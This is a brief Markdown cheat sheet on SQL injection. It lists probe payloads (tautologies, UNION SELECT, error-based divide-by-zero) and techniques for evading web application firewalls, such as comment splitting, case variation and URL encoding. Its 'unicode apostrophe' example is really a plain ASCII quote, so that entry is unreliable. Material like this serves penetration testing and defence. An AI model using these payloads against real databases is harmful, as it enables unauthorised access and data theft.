## SQL Injection

### Detection
```bash
# Single quote test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

# Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```

